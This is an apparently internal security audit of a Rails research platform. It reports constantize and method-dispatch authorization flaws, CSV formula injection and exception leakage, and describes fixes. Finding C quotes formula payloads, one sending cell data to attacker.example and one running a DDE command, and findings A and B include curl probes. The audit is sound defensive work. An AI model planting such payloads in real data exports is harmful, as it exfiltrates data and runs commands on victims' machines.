# Security Audit (non-SQLi)

Companion to `SQL_INJECTION_AUDIT.md`. This document covers other common
vulnerability classes reviewed across `grit-core`, `grit-assays`, and
`grit-compounds`. Findings first, then the classes that came back clean or are
by-design, then areas that warrant a deeper look.

## Background

Authorization in this platform is **entity-class-level** (role/permission), not
per-record: `check_read`/`check_write` in
`modules/core/backend/app/controllers/concerns/grit/core/controller/authorized.rb`
gate access by `klass.entity_crud[:read|:write]` against
`current_user.permission?`. Record-level IDOR is therefore not the threat model.
The findings below are the places where that model is bypassed, or where user
input reaches a dangerous sink.

---

## A. Unsafe `constantize` on user input + missing authorization — HIGH (Fixed)

**File:** `modules/core/backend/app/controllers/grit/core/entities_controller.rb:50, 55`

```ruby
def columns
  klass = params[:entity_id].constantize
  render json: { success: true, data: klass.entity_columns(**params.permit!.to_h.symbolize_keys) }
end

def fields
  klass = params[:entity_id].constantize
  render json: { success: true, data: klass.entity_fields(**params.permit!.to_h.symbolize_keys) }
end
```

Three problems compound here:
1. `params[:entity_id].constantize` resolves an **arbitrary class name** supplied
   by the caller. There is no allow-list.
2. The controller includes only `Grit::Core::Controller::Authenticated`, **not
   `Authorized`** — so the per-entity `check_read` permission is never applied to
   these actions.
3. `params.permit!` whitelists every request param and splats it as keyword
   arguments into the model method.

### How it can be exploited

- **Arbitrary class instantiation / probing:** `entity_id` is `constantize`d with
  no allow-list, so any loaded class name resolves; unknown names raise
  `NameError` → uncaught 500, useful for fingerprinting.
- **Authorization bypass / schema disclosure:** the actions only include
  `Authenticated`, so a user with no read permission on an entity can still
  enumerate its columns/fields.

```bash
# arbitrary-class probe (note: marker class does not exist)
curl -s "http://localhost:3000/api/grit/core/entities/Kernel/columns" \
  -H "Authorization: Bearer <token>"
```
- **Vulnerable** → `Kernel.constantize` resolves, then `Kernel.entity_columns`
  raises `NoMethodError` → uncaught 500 (verbose dev trace), proving an arbitrary
  class was loaded and dispatched to.
- **Fixed** → `{"success":false,"errors":"Unknown entity"}` (HTTP 400);
  `Kernel` is not in the entity allow-list, so `constantize` is never reached.

Schema-disclosure / authz check (valid entity, but caller lacks `read:system`):
```bash
curl -s "http://localhost:3000/api/grit/core/entities/Grit::Compounds::Compound/columns" \
  -H "Authorization: Bearer <token>"
```
- **Vulnerable** → returns the full column list regardless of permission.
- **Fixed** → `{"success":false,"errors":"You do not have the permissions ..."}`
  (HTTP 403) when the caller lacks the entity's `entity_crud[:read]`; otherwise
  the column list, as before.

(The same raw-`constantize`-from-input pattern exists at
`load_set_blocks_controller.rb:253,267` and `load_sets_controller.rb:132,144`,
but there the value comes from a stored `LoadSet.entity` record rather than the
request, so the risk is lower — still worth allow-listing.)

### How it could be fixed — **Done**

`entities_controller.rb` `columns`/`fields` now route through a private
`authorized_entity` helper that:
- rejects any `entity_id` **not present in the `entities` allow-list** (HTTP 400)
  before calling `constantize`;
- enforces the entity's own `entity_crud[:read]` against `current_user`
  (HTTP 403), mirroring `Authorized#check_read` but for the *resolved* entity;

and `params.permit!` is replaced with an explicit `entity_args` allow-list of the
scoping keys the `entity_properties` chain actually consumes (`data_table_id`,
`assay_data_sheet_definition_id`, `experiment_id`, `load_set_block_id`,
`load_set_id`, `with_experiment_id`).

---

## B. Method dispatch from `params[:scope]` gated only by `respond_to?` — MEDIUM (Fixed)

**Files:**
- `modules/core/backend/app/controllers/concerns/grit/core/controller/readable.rb:178`
- `modules/core/backend/app/controllers/concerns/grit/core/controller/writable.rb:83`
- `modules/core/backend/app/controllers/grit/core/vocabulary_items_controller.rb:32`

```ruby
def get_scope(scope, params)
  klass = get_model(params)
  klass_scope = klass.send(scope, params) if klass.respond_to?(scope)
  ...
end
# scope originates from params[:scope] (readable.rb:74, writable.rb:50)
```

`scope` is attacker-controlled, and `respond_to?(scope)` is true for the model's
**entire** public API — including methods inherited from `ActiveRecord::Base`,
not just the intended named scopes (`detailed`, `available`, etc.).

`scope` is attacker-controlled, and `respond_to?(scope)` is true for the model's
**entire** public API — including inherited `ActiveRecord` methods such as
`update_all`, `delete_all`, `delete_by`, `connection`, `column_names`, not just
the intended named scopes (`detailed`, `available`, …).

### How it can be exploited

The blast radius is limited today (strong-params rejects `where`/`delete_by`
arguments, no-arg methods raise `ArgumentError`, non-relation returns blow up in
`count`/`limit`), so most attempts yield a 500 rather than data loss — but it is
an over-broad sink: any public class method reachable by name, and any future
model helper silently exposed as a "scope".

```bash
# inherited ActiveRecord method reachable by name
curl -i -s "http://localhost:3000/api/grit/core/countries?scope=column_names" \
  -H "Authorization: Bearer <token>"
```
- **Vulnerable** → HTTP 500: `respond_to?("column_names")` is true, so
  `Country.column_names(params)` is dispatched (raising `ArgumentError` here) —
  proving an arbitrary inherited method was invoked. (`?scope=delete_all` /
  `update_all` reach the same dispatch.)
- **Fixed** → HTTP 400 `{"errors":"... does not implement scope 'column_names'"}`
  — rejected before dispatch.

### How it could be fixed — **Done**

Added a model predicate `entity_scope?(scope)` to `GritEntityRecord`
(`grit_entity_record.rb`, `class_methods` block) that returns true only for
methods **defined by application code** (`method(scope).source_location` under
`/modules/`), never for inherited `ActiveRecord`/Ruby methods. All three dispatch
sites now gate on it instead of `respond_to?`:
`readable.rb:178`, `writable.rb:83`, `vocabulary_items_controller.rb:32`. This
covers every app-defined scope (base scopes in the concern and per-model
overrides) without an enumerated list, and auto-includes future scopes.
(`data_type.model_scope` is only ever called with a hardcoded `"detailed"`, not
request input, so it was left as-is.)

---

## C. CSV / formula injection in exports — MEDIUM

**File:** `modules/core/backend/app/controllers/concerns/grit/core/controller/readable.rb:99-114`
(same applies to the other `send_data ... csv` exports in
`compounds_controller.rb:131`, `data_table_rows_controller.rb:53`,
`load_set_blocks_controller.rb:113,128`)

```ruby
csv_sql = "COPY (#{query.to_sql}) TO STDOUT WITH DELIMITER ',' CSV HEADER"
...
temp_file.write(row.force_encoding("UTF-8"))   # raw cell values, no neutralization
```

Cell values are written verbatim to the CSV. Many of those values are
user-entered free text (compound names, descriptions, metadata).

### How it can be exploited

A user stores a value beginning with `=`, `+`, `-`, or `@`, then anyone who
opens the exported file in Excel / Google Sheets / LibreOffice triggers formula
evaluation (CWE-1236, "Formula Injection"). Examples:
- `=HYPERLINK("https://attacker.example/?leak="&A1, "click")` — exfiltrate
  neighbouring cell data.
- `=cmd|'/c calc'!A1` — DDE-based command execution on older/misconfigured Excel.

### How it could be fixed

When generating each cell, prefix a leading formula trigger with a single quote
(or wrap the field in quotes), e.g. neutralize values matching `/\A[=+\-@\t\r]/`
by prepending `'`. Apply in the CSV-writing layer so all export paths are
covered.

---

## D. Exception detail leaked to client — LOW

**Files:** `writable.rb:38-41,56-59,68-71`, `readable.rb:136-139,159-162`, `show`/`export` rescue blocks.

```ruby
rescue StandardError => e
  logger.info e.to_s
  logger.info e.backtrace.join("\n")
  render json: { success: false, errors: e.to_s }, status: :internal_server_error
end
```

The raw exception message (`e.to_s`) is returned in the HTTP response. Database
and internal errors often embed table/column names, constraint details, or
fragments of the failing query — useful reconnaissance for an attacker (and a
helpful oracle for the SQLi findings in the companion doc).

### How it could be fixed

Return a generic message to the client and keep details server-side only:

```ruby
render json: { success: false, errors: "Internal server error" }, status: :internal_server_error
```

---

## Reviewed and clean / by design

- **Hardcoded secrets / API keys:** none found in `app`, `lib`, or `config`.
- **Open redirect:** no `redirect_to` driven by request params.
- **OS command / shell injection:** no `system`, backticks, `%x`, `exec`,
  `IO.popen`, or `spawn`; the only `*.open` calls are `Zip::OutputStream.open`
  on server-controlled `Tempfile` paths.
- **Path traversal in downloads:** `send_file` / `send_data` use server-side
  `Tempfile` paths and ActiveStorage `download`, never a user-supplied path.
- **Mass assignment:** generic CRUD uses `params.permit(self.permitted_params)`;
  the lone `params.permit!` in `assay_data_sheet_definitions_controller.rb:25` is
  immediately `.slice("name", "description", "assay_model_id", "result", "sort")`
  before `create`, so it is constrained — safe. (The `entities_controller`
  `permit!` is covered in finding A.)
- **Record-level IDOR:** authorization is intentionally entity-class-level
  (role/permission), applied consistently via the `Authorized` concern.

---

## Warrants a deeper look (not fully audited)

- **ReDoS / DB regex:** the `regexp` filter operator
  (`modules/core/backend/lib/grit/core.rb:71`) passes the user value straight
  into a PostgreSQL `~ ?` match. A pathological pattern could pin a database
  backend. Consider validating/limiting regex filters.
- **File-upload validation:** experiment attachments — verify content-type and
  size limits, and that stored filenames cannot influence later file operations.
- **Authentication/session:** recent commits added 2FA rate-limiting and reset-
  token expiry. A focused review of `lib/grit/core/authentication_strategies.rb`
  and session rotation/fixation on login would be the natural next step.
